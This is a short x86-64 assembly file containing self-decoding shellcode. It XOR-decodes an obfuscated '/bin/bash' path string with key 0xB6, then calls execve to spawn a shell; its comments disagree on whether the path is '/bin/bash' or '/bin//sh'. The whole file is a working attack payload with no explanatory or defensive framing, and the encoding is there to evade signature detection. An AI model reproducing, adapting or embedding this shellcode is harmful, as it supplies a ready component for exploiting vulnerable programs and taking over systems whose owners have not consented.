bits 64

initshellcode:
    xor rax, rax
    push rax            ; NULL terminator envp

    mov rdx, rsp        ; rdx = envp

    push rax            ; NULL terminator argv
    mov rdi, 0xDEC5D7D499999999   ; "/bin/bash"
    push rdi
    mov rdi, 0x99D8DFD499999999
    push rdi
    mov rdi, rsp        ; rdi = ptr vers "/bin//sh"
    jmp xorshellcode

shellcodeExecution:
    xor rax,rax
    push rax            ; NULL
    push rdi            ; ptr "/bin//sh"
    mov rsi, rsp        ; rsi = argv ["/bin//sh", NULL]

    mov al, 59          ; execve
    syscall

xorshellcode:
    xor byte [rdi+rax], 0xB6
    cmp rax,0xf
    je shellcodeExecution
    inc rax
    jmp xorshellcode
